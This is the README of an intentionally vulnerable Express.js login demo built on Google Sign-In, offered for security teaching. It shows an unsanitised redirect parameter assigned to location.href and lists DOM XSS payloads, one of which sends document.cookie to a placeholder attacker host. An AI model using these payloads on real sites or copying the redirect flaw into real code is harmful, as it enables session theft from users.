# GIS Login App with DOM XSS Vulnerability

A simple Express.js application demonstrating Google Identity Services (GIS) integration with an intentional DOM-based XSS vulnerability for security testing purposes.

## Features

- Google Sign-In with popup method
- Google One-Tap sign-in
- Profile page displaying user information
- Minimal UI using Winky Sans font
- **Intentional DOM XSS vulnerability** in redirect parameter handling

## Setup with Docker (Recommended)

1. Configure Google OAuth:
   - Go to [Google Cloud Console](https://console.cloud.google.com/)
   - Create a new project or select an existing one
   - Enable Google Identity Services API
   - Create OAuth 2.0 credentials (Web application)
   - Add authorized JavaScript origins: `http://localhost`
   - Add authorized redirect URIs: `http://localhost`
   - Copy your Client ID

2. Update `.env` file:
```
GOOGLE_CLIENT_ID=your_actual_client_id_here.apps.googleusercontent.com
PORT=80
```

3. Run the application:
```bash
docker compose up
```

4. Visit `http://localhost`

To stop the application:
```bash
docker compose down
```

## Setup without Docker

1. Install dependencies:
```bash
npm install
```

2. Follow steps 1-2 from Docker setup above

3. Run the application:
```bash
npm start
```

4. Visit `http://localhost`

## Vulnerability Details

The application contains a **DOM-based XSS vulnerability** in the login page (`views/login.ejs:43-47`).

### Vulnerable Code:
```javascript
const urlParams = new URLSearchParams(window.location.search);
const redirect = urlParams.get('redirect');

if (redirect) {
  location.href = redirect;  // VULNERABLE
}
```

### Exploit Example:
```
http://localhost/login?redirect=javascript:alert('XSS')
```

After successful login, the application will execute the JavaScript payload in the redirect parameter.

### Additional XSS Payloads:
```
?redirect=javascript:alert(document.cookie)
?redirect=javascript:fetch('https://attacker.com?cookie='+document.cookie)
?redirect=data:text/html,<script>alert('XSS')</script>
```

## File Structure

```
├── server.js           # Express server
├── package.json        # Dependencies
├── Dockerfile          # Docker configuration
├── docker-compose.yml  # Docker Compose configuration
├── .dockerignore       # Docker ignore file
├── .env                # Environment variables
├── .env.example        # Environment variables template
├── views/
│   ├── login.ejs       # Login page (contains vulnerability)
│   └── profile.ejs     # Profile page
└── public/
    └── styles.css      # Minimal styling
```

## Educational Purpose

This application is created for security testing and educational purposes to demonstrate:
- How DOM-based XSS vulnerabilities occur
- The importance of input validation and sanitization
- Secure redirect handling practices
